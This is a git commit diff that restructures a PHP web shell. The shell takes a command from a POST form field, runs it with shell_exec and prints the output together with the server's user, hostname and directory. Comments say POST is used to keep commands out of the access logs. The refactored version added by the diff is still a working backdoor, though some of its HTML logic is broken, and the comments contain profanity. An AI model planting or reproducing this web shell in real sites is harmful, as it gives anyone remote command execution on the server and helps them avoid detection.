b3caf0077bfa939a7bb457217a0ecbbdad290d66
raincoats <tomshaddock@outlook.com>
2015-05-20 13:52:40 +1000

    uuuuuuugghhh complete restructuring in progress

--- 2233.php
+++ 2233.php
@@ -1,3 +1,4 @@
+<?php echo 1+1; ?>
 <?php
 
 /*
@@ -17,34 +18,6 @@
 {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
 */
 
-// this is like
-// www-data@website.org : /var/www/
-$inf0 = shell_exec('echo "$(whoami)@$(hostname) : $(pwd)"');
-$thisscript = basename($_SERVER['SCRIPT_NAME']);
-
-// this is just formatting etc, skip this
-echo <<< EOF
-<!DOCTYPE HTML>
-<html>
-	<head>
-		<style>
-			input{ background-color: #fff; width: 50%; } 
-			code, input{ font-size: 12px; color:#000; 
-			font-family: "Monaco","Consolas", monospace !important; } 
-			body{ background-color:#fafafa; } 
-			banana{ color: #aaa; }
-		</style>
-	</head>
-	<body>
-		$inf0
-		<form action="$thisscript" method="POST">
-			<input type="text" name="whosthere" autocomplete="off" autofocus>
-			<br>
-			<button value="Submit" name="submit" type="submit">~$$$$</button>
-		</form>
-		<code>
-			<pre><br><br>
-EOF;
 
 //   this is where the fun happens
 //   the html element isn't called banana for any reason, basically 
@@ -52,18 +25,80 @@ EOF;
 //   POSTs because otherwise you'll leave stuff in the access logs
 //   also, note all commands happen 2>&1 to save you from typing it
 
-
-if (isset($_POST["whosthere"])) {
-	$cmd = $_POST["whosthere"];
-	echo "<banana>$ ". $cmd ."</banana>\r\n\r\n". shell_exec($cmd." 2>&1");
+function continental_breakfast_is_not_real_breakfast($cmd){
+		// this function does the shell exec
+		echo "<banana>$ ". $cmd ."</banana>\r\n\r\n". shell_exec($cmd." 2>&1");
 }
 
-// gotta keep your html all semantic and proper and shit
-echo <<< EOF
-			</pre>
-		</code>
-	</body>
-</html>
+function up_the_dole(){
+	// this is a few bits of inf0 for the user, like
+	// www-data@website.org : /var/www/
+	return shell_exec('echo "$(whoami)@$(hostname) : $(pwd)"');
+}
+
+function reddit_is_a_horrible_website(){
+	// this is just the location of the script, we need this so the html form
+	// knows where to submit the command, and so you when you press enter/submit,
+	// you come back to the same page, and not some useless 404 page
+	return basename($_SERVER['SCRIPT_NAME']);
+}
+
+
+// this is just formatting etc, skip this
+function fuck_abbott($which){
+	$html_top = <<< EOF
+	<!DOCTYPE HTML>
+	<html>
+		<head>
+			<style>
+				input{background-color:#fff;width:50%;}code,input{font-size:12px;color:#000;font-family:"Monaco",
+				"Consolas",monospace !important;}body{background-color:#fafafa;}banana{ color:#aaa;}
+			</style>
+		</head>
+		<body>
+			$up_the_dole
+			<form action="reddit_is_a_horrible_website()" method="POST">
+				<span>$ </span>
+				<input type="text" name="whosthere" autocomplete="off" autofocus>
+				<span>2&gt;&amp;1</span><br>
+				<button value="Submit" name="submit" type="submit">~$$$$</button>
+			</form>
+			<code>
+				<pre><br><br>
 EOF;
+	// gotta keep your html all semantic and proper and shit
+	$html_bottom = <<< EOF
+				</pre>
+			</code>
+		</body>
+	</html>
+EOF;
+
+	if ($which == 0){
+		return $html_top;
+	} else {
+		return $html_bottom;
+	}
+
+}
+
+function main(){
+
+	// top html
+	fuck_abbott(0);
+
+	// this is only false when some1 first
+	// accesses the page, to stop it running
+	// empty commands or w/e
+	if (isset($_POST["whosthere"])) { // 5h3ll 3x3c
+		continental_breakfast_is_not_real_breakfast($_POST['whosthere']);
+	}
+
+	// bottom html
+	fuck_abbott(1);
+
+}
+
+main();
 
 ?>
